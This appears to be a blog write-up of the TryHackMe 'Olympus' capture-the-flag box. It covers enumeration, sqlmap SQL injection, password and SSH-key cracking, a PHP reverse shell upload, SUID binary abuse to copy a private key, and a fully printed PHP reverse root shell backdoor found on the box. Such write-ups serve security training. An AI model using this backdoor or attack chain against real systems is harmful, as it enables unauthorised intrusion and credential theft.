---
layout: post
author: L0
---

# THM - Olympus

![image](/images/Pasted image 20221013213214.png)

## Enumeration

### nmap

starting with nmap

```shell
┌──(kali㉿kali)-[~/THM/Olympus]
└─$ sudo nmap -A -p- -oN olympus.nmap olympus.thm
sudo: unable to resolve host kali: Temporary failure in name resolution
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 15:34 EDT
Nmap scan report for olympus.thm (10.10.178.129)
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)
|   256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)
|_  256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Olympus
|_http-server-header: Apache/2.4.41 (Ubuntu)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   35.93 ms 10.11.0.1
2   37.36 ms olympus.thm (10.10.178.129)
```

i found 2 open ports.

- `22` ssh service
- `80` apache web server

![image](/images/Pasted image 20221207204424.png)

the website has not much to offer. just a prompt that an older version of the website is still online.

### dirbusting

```shell
$ ffuf -w `fzf-wordlist` -u http://olympus.thm/FUZZ -e ".txt"

.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
.hta.txt                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
                        [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 39ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 41ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3854ms]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 38ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms]
:: Progress: [9228/9228] :: Job [1/1] :: 1115 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

```

dirbusting returned `~webmaster` as a very good starting point.

![image](/images/Pasted image 20221207204554.png)

the old website seems to be some kind of cms. after a bit of digging i found a login form and a search field.

### sqli

![image](/images/Pasted image 20221207205145.png)

i tried some `sqli` and got an error. yay. i copied the search request from web-dev-tools as `curl` command and replaced `curl` with `sqlmap`

with the flag `--dbs` i got the database name `olympus` and with `--tables` i got the tables underneath.

```shell
[03:28:53] [INFO] fetching tables for database: 'olympus'
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
```

in the `flag` table i got the first flag of the box.
then i dumped the `users` table and got 3 users.

```shell
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

in the end only one user was saved without salt. and only this user hash was crackable with john.

```shell
$ john --wordlist=/usr/share/wordlist/rockyou.txt prometheus_hash.txt
```

```
pw: s********e
```

i saw in the user email that a virtual host with the name `chat.olympus.thm` might exist. i added it to my `/etc/hosts` file.

![image](/images/Pasted image 20221207215146.png)

on that page i was presented with a login page. i logged in with the credentials i received and was in a chat app.

![image](/images/Pasted image 20221207215813.png)

### getting reverse shell

a conversation explained that you could upload files. but after uploading they got randomly renamed so nobody could redownload them as a security measure.

![image](/images/Pasted image 20221214093251.png)

with dirbusting i found the upload folder but was not sure how to get to the uploaded shell, i was uploading.

```shell
$ ffuf -w `fzf-wordlist` -u http://chat.olympus.thm/FUZZ

.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3851ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3869ms]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3884ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 39ms]
phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 35ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 36ms]
static                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 36ms]
uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 36ms]

```

i tried to log into the CMS system. the same credentials worked here too. i needed to find some hint. first i thought file inclusion could reveal the source code of the randomized file name function. i was a bit lost.

![image](/images/Pasted image 20221214225125.png)

i looked again in the database. and then i saw the table name `chat`. dumping this table i got the filenames.

```shell
| 2022-12-14 | Attached : shell.php                                                                                                                                            | 877997437bba50c3bdecc712217cc48d.php | prometheus |
```

after setting up a listener i executed the php code and got a reverse shell in the box.

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.9.206] 49928
ls
877997437bba50c3bdecc712217cc48d.php
index.html
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
```

## Privilege Escalation

i found the second flag in the `/home/zeus` folder.

```shell
www-data@olympus:/home/zeus$ ls
snap  user.flag  zeus.txt

www-data@olympus:/home/zeus$ cat user.flag
flag{Y0**********************w3R}
www-data@olympus:/home/zeus$ cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



                                                - Prometheus.

```

i did the usual privesc stuff. then i searched for files that are owned by `zeus`.
a interesting binary with the name of `cpuitls` got my attention. the same bin had a `suid` bit set.

```shell
www-data@olympus:/tmp$ find / -user "zeus" 2>/dev/null
/home/zeus
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.ssh
/home/zeus/snap
/home/zeus/.gnupg
/home/zeus/.local
/home/zeus/.local/share
/home/zeus/.bashrc
/home/zeus/.profile
/home/zeus/.cache
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/crash/_usr_bin_cp-utils.1000.crash
www-data@olympus:/tmp$ /usr/bin/cp
cp                         cpp
cpan                       cpp-9
cpan5.30-x86_64-linux-gnu  cputils
cpio
www-data@olympus:/tmp$ /usr/bin/cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: asd

Error Occurred!www-data@olympus:/tmp$
```

after execution it wants to have a source file and a target file. i thought i try to copy the private ssh key to a different location. and it worked.

```
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /home/zeus/test.txt
```

i was able to read it and tried to log in as zeus.

```shell
www-data@olympus:/home/zeus$ cat test.txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
eow4Kk0N2LTAHtOzNd7PnnvQdT3NdJDKz5bUgzXE7mCFJkZXOcdryHWyujkGQKi5SLdLsh
vNzjabxxq9P6HSI1RI4m3c16NE7yYaTQ9LX/KqtcdHcykoxYI3jnaAR1Mv07Kidk92eMMP
...
```

```shell
$ ssh zeus@olympus.thm -i zeus_priv_key.txt
The authenticity of host 'olympus.thm (10.10.9.206)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'olympus.thm' (ED25519) to the list of known hosts.
Enter passphrase for key 'zeus_priv_key.txt':
```

unfortunately a passphrase was expected. so next up `ssh2john`

```shell
$ ssh2john zeus_priv_key.txt > zeus_priv_key_hash.txt
```

with this hash i could execute john on the rockyou list and got the passphrase.

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus_priv_key_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s*******e        (zeus_priv_key.txt)
1g 0:00:00:29 DONE (2022-12-14 04:19) 0.03368g/s 51.19p/s 51.19c/s 51.19C/s esperanza..emotional
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

```shell
zeus:s*******e
```

### root

```shell
zeus@olympus:~$ id
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

next i checked groups. i found a few things online that could work with `adm` and `sudo`. but the password of `zeus` was still missing.

i looked into the hosted web content and was surprised that one folder had a very random name.

```shell
zeus@olympus:/var/www/html$ ls
0aB44fdS3eDnLkpsz3deGv8TttR4sc  index.html.old  index.php
```

inside was a php file that said about itself that it was a `root reverse backdoor`.

```shell
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>

```

i executed the file in the browser and got a nice manual how to connect back as root.

![image](/images/Pasted image 20221214215926.png)

setting up the listener and filling in the password from the php file and i got the root shell.

![image](/images/Pasted image 20221214215941.png)

after navigating to `/root` i got the `root.flag`

```shell
root@olympus:/# cd root
root@olympus:/root# ls
config  root.flag  snap
root@olympus:/root# cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{D******************_}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

```

### hidden flag

the file suggested to log back in with ssh to find the last flag. after setting up a new ssh key and restarting the ssh service i could log back in and search for the flag.

as i was root i could find any string in any file. the flag format was `flag{****}`.
so this command `grep -rn '/' -e "\bflag{"` and a bit of wait time gave me the last flag.

```shell
root@olympus:~# grep -rn '/' -e "\bflag{"
/root/root.flag:40:                   flag{D******************_}
Binary file /boot/initrd.img-5.4.0-109-generic matches
Binary file /boot/initrd.img-5.4.0-107-generic matches
/home/zeus/user.flag:1:flag{Y0u_G0t_TH3_l1ghtN1nG_P0*3R}
grep: /run/snapd/ns/lxd.mnt: Invalid argument
/etc/ssl/private/.b0nus.fl4g:3:flag{Y***************}
/etc/ssl/private/.b0nus.fl4g:8:grep -irl flag{

```

[L0]
